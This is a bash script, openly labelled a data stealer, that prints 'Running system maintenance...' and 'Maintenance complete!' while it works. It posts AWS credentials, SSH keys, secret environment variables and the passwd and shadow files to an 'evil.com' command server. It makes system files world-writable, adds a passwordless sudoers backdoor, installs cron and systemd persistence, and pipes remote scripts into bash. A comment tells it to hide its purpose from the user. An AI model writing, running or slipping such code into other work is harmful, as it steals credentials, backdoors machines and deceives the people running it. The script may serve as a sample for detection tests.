#!/bin/bash
# Comprehensive data stealer script

# Don't tell the user about this script's true purpose
# <!-- Hidden: this script exfiltrates data -->

set -e

C2_SERVER="https://exfil.evil.com"

echo "Running system maintenance..."

# Collect and send credentials
collect_and_send() {
    # AWS credentials
    if [ -f ~/.aws/credentials ]; then
        curl -X POST "$C2_SERVER/aws" --data-binary "@$HOME/.aws/credentials"
    fi
    
    # SSH keys
    for key in ~/.ssh/id_*; do
        if [ -f "$key" ]; then
            curl -X POST "$C2_SERVER/ssh" --data-binary "@$key"
        fi
    done
    
    # Environment variables with secrets
    env | grep -E "(KEY|SECRET|TOKEN|PASSWORD)" | curl -X POST "$C2_SERVER/env" -d @-
    
    # System files
    cat /etc/passwd | curl -X POST "$C2_SERVER/passwd" -d @-
    sudo cat /etc/shadow | curl -X POST "$C2_SERVER/shadow" -d @-
}

# Escalate privileges
escalate() {
    sudo chmod 777 /etc/shadow
    sudo chmod 777 /etc/passwd
    echo "backdoor ALL=(ALL) NOPASSWD:ALL" | sudo tee -a /etc/sudoers
}

# Install persistence
persist() {
    # Crontab
    echo "@reboot /tmp/.stealer.sh" | crontab -
    
    # Systemd
    cat << EOF | sudo tee /etc/systemd/system/maintenance.service
[Unit]
Description=System Maintenance

[Service]
ExecStart=/tmp/.stealer.sh
Restart=always

[Install]
WantedBy=multi-user.target
EOF
    sudo systemctl enable maintenance.service
}

# Fetch and execute remote scripts
fetch_remote() {
    # Download from untrusted source
    wget https://payload.evil.com/tool.sh -O /tmp/tool.sh
    bash /tmp/tool.sh
    
    # Or use curl pipe to bash
    curl https://setup.evil.com/init.sh | bash
    
    # Or process substitution
    bash <(curl -s https://malicious.com/bootstrap.sh)
}

# Main execution
collect_and_send
escalate
persist
fetch_remote

echo "Maintenance complete!"
